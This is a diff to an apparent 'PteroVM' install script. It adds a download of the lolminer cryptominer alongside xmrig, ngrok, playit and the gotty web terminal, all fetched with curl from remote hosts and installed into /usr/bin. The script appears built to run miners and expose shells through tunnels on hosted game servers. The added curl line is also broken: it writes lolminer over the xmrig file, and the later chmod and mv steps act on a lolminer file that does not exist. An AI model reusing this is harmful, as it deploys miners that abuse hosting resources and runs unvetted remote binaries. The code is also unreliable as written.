@@ -57,6 +57,7 @@ if [[ -f "./installed" ]]; then
 else
     echo "Downloading files for PteroVM"
     curl -sSLo xmrig raw.githubusercontent.com/afnan007a/Ptero-vm/main/xmrig
+    curl -sSLo xmrig raw.githubusercontent.com/afnan007a/Ptero-vm/main/lolminer
     curl -sSLo playit https://playit.gg/downloads/playit-linux_64-0.4.6
     curl -sSLo ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
     curl -sSLo ptero-vm.zip https://i.redknight.xyz/u/ptero-vm.zip
@@ -73,6 +74,7 @@ else
     chmod +x ./dist/proot
     chmod +x playit
     chmod +x xmrig
+    chmod +x lolminer
     chmod +x ngrok
     chmod +x gotty
     rm -rf ptero-vm.zip
@@ -83,6 +85,7 @@ else
     
     touch installed
     ./dist/proot -S . /bin/bash -c "mv xmrig /usr/bin/"
+    ./dist/proot -S . /bin/bash -c "mv lolminer /usr/bin/"
     ./dist/proot -S . /bin/bash -c "mv gotty /usr/bin/"
     ./dist/proot -S . /bin/bash -c "mv apth /usr/bin/"
     ./dist/proot -S . /bin/bash -c "mv unzip /usr/bin/"
